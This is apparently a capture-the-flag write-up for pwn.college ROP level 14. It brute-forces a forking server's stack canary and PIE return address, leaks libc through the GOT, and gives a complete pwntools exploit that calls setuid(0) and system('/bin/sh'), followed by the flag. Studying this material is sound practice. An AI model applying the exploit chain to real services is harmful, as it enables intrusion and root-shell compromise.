---
layout: post
title: (ROP) level 14
categories: pwn.college ROP
date: 2025-07-13 13:23:04 +0300
tags: ROP pwn.college stack-canary brute-force PIE ASLR ret2libc partial-overwrite
---

## Information 
- category: pwn

## Description 
> Perform ROP against a network forkserver!

## Write-up
**Connecting to the Challenge**

When you connect to the server at ```127.0.0.1``` on port ```1337``` using ```nc```, you'll notice that the program waits for input but gives no immediate output:
```bash
nc 127.0.0.1 1337
ABCD
Leaving!
### Goodbye!
```

**Protections in Place**
The binary has multiple protections enabled:
- ✅ **PIE** (Position Independent Executable)
- ✅ **Stack** Canary
- ✅ **ASLR** (Address Space Layout Randomization)

There’s **no direct leak**, so we need to **bypass all of them** in order to build a successful exploit.

```bash
checksec babyrop_level14.1
[*] '/home/k1k0/Desktop/program-security-dojo/return-oriented-programming/level-14-1/_0/babyrop_level14.1'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**Brute-Forcing the Stack Canary**
Since the program is running as a **forking server** and allows **unlimited reconnections**, we can **brute-force the stack canary one byte at a time**.

This method works because:  
- The canary is **at a fixed offset** from the input buffer. 
- The server forks a new process for each connection, so even if we crash one, the next attempt is fresh. 
- We can reuse the crash information to determine **which byte guess was correct**.

> This method is reliable as long as the process resets and the canary stays consistent between forks.
{: .prompt-tip}

We’ll use `pwndbg` to determine this offset by:
```plaintext
Thread 2.1 "babyrop_level14" hit Breakpoint 1, 0x000056657562d90a in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────
 RAX  0x7ffef6753230 —▸ 0x56657562db30 (__libc_csu_init) ◂— endbr64 
 RBX  0x56657562db30 (__libc_csu_init) ◂— endbr64 
 RCX  0x7ffef67533b8 —▸ 0x7ffef6754224 ◂— '/challenge/babyrop_level14.1'
 RDX  0x1000
 RDI  0
 RSI  0x7ffef6753230 —▸ 0x56657562db30 (__libc_csu_init) ◂— endbr64 
 R8   0
 R9   0x75157d625540 ◂— 0x75157d625540
 R10  0x75157d625810 ◂— 0x33a5
 R11  0x246
 R12  0x56657562d240 (_start) ◂— endbr64 
 R13  0x7ffef67533b0 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffef6753260 —▸ 0x7ffef67532c0 ◂— 0
 RSP  0x7ffef6753200 —▸ 0x566575630010 (stdout@@GLIBC_2.2.5) —▸ 0x75157d61f6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
 RIP  0x56657562d90a (challenge+55) ◂— call 0x56657562d1c0
──────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────
 ► 0x56657562d90a <challenge+55>    call   read@plt                    <read@plt>
        fd: 0 (socket:[677344362])
        buf: 0x7ffef6753230 —▸ 0x56657562db30 (__libc_csu_init) ◂— endbr64 
        nbytes: 0x1000
──────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────
 ► 0   0x56657562d90a challenge+55
   1   0x56657562dafe main+457   <--- Ret addrr
   2   0x75157d456083 __libc_start_main+243
   3   0x56657562d26e _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> i f
Stack level 0, frame at 0x7ffef6753270:
 rip = 0x56657562d90a in challenge; saved rip = 0x56657562dafe
 called by frame at 0x7ffef67532d0
 Arglist at 0x7ffef6753260, args: 
 Locals at 0x7ffef6753260, Previous frame's sp is 0x7ffef6753270
 Saved registers:
  rbp at 0x7ffef6753260, rip at 0x7ffef6753268
pwndbg> dist $rsi $rbp-0x8
0x7ffef6753230->0x7ffef6753258 is 0x28 bytes (0x5 words)
pwndbg> dist $rsi 0x7ffef6753270
0x7ffef6753230->0x7ffef6753270 is 0x40 bytes (0x8 words)
pwndbg> 
```
> This offset tells us exactly how many bytes to send before reaching the canary.
{: .prompt-tip}

**Brute-Forcing the Return Address to Bypass PIE**
We already leaked or brute-forced the **stack canary**, and now we want to **find the full return address** on the stack to bypass **PIE** (Position Independent Executable).
From the program behavior, we know:
- The return address points to `main+457`, for example:
```plaintext
0x56657562dafe
```
- When the **correct return address** is in place, the program prints `"Goodbye"` — this gives us clear feedback during brute-forcing.

- PIE randomizes the **base address** of the binary every run.
- But if we know the address of `main+457`, and we know the offset of `main` from the ELF base, we can calculate the base address like this:
```plaintext
elf_base = leaked_ret_address - offset_of_main_plus_457
```

> This technique allows us to defeat PIE without a memory leak — just behavior-based brute force.
{: .prompt-info}

**Leaking the Libc Base Address** 
Now that we’ve recovered:
- ✅ The **PIE base address** (by brute-forcing the return address and subtracting the known offset of `main+457`) 
- ✅ The **stack canary**

We’ll use the **GOT (Global Offset Table)** to leak the actual address of a libc function. For example, we can print the address of `__libc_start_main` from the GOT:
```plaintext
puts(@GOT[__libc_start_main])
```

Once we leak the runtime address of `__libc_start_main`, we simply subtract its known offset from libc (e.g. `0x24083`):
```plaintext
libc_base = leaked_libc_start_main - libc.symbols['__libc_start_main']
```

> Use `puts(@got[func])` to leak any libc symbol, then resolve the full libc base from it.
{: .prompt-tip}


## Exploit
```python
from pwn import *

canary_offset = 0x28
ret_offset = 0x38

def brute_canary():
    fixed = b"\x00"
    canary = fixed
    while len(canary) < 0x8:
        for byte in range(0x0,0xff):
            with remote("127.0.0.1",1337) as p:
                payload = b"A"*canary_offset + canary + p8(byte)

                p.send(payload)
                res = p.recvall(timeout=1)

                if b"*** stack smashing detected ***" not in res:
                    canary += p8(byte)
                    break
    return canary    

def brute_ret(canary):
    ret = b"\xfe"
    while len(ret) < 0x6:
        for byte in range(0,0x100):
            r = remote("127.0.0.1",1337)
            payload = b"A"*canary_offset  + canary + b"A"*8 + ret + p8(byte)
            r.send(payload)
            res = r.recvall(timeout=3)
            r.close()
            if b"### Goodbye!" in res:
                ret += p8(byte)
                break
    return ret

def leak_base(canary, ret):
    offset_main = 0x1afe  # from symbol main+457
    offset__libc_start_main = 0x23f90 

    elfbase = u64(ret.ljust(8,b"\x00")) - offset_main 
    elf = context.binary = ELF("/challenge/babyrop_level14.1")
    elf.address = elfbase
    rop = ROP(elf)

    log.success(f"ELF Base: {hex(elfbase)}.")

    payload = flat(
        b"A"*canary_offset,
        canary,
        b"B"*8,
        rop.rdi.address,
        elf.got['__libc_start_main'],
        elf.symbols['puts']
    )

    while True:
        r = remote("127.0.0.1",1337)
        r.send(payload)
        res = r.recvall(timeout=2)

        if (b"Leaving!" in res) and (b"*** stack" not in res):
            leak = res.strip().split(b"\n")[1]
            libcbase = u64(leak.ljust(8,b"\x00")) - offset__libc_start_main 
            log.success(f"libc base: {hex(libcbase)}.")
            return libcbase

def send_payload(canary, libcbase):
    lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    lib.address = libcbase
    rop = ROP(lib)

    payload = flat(
        b"A"*canary_offset,
        canary,
        b"B"*8,

        rop.ret.address,
        rop.rdi.address,
        0,
        lib.symbols['setuid'],

        rop.ret.address,
        rop.rdi.address,
        next(lib.search(b"/bin/sh\x00")),
        lib.symbols["system"]
    )

    r = remote("127.0.0.1",1337)
    r.send(payload)   
    r.interactive()

def attack():
    try:
        canary = brute_canary()
        ret = brute_ret(canary)

        log.success(f"Canary: {canary}.")
        log.success(f"(main+457): {ret}.")

        libcbase = leak_base(canary, ret)
        send_payload(canary, libcbase)

    except Exception as e:
        log.warning(f"Fail: {e}")

def main():
    attack()

if __name__ == "__main__":
    main()
```
## Flag
> Flag: ``` pwn.college{H1EnE_SALGQDMhB1PSrD81fMDL5.dZTcSSXsM0TNxgzW}```




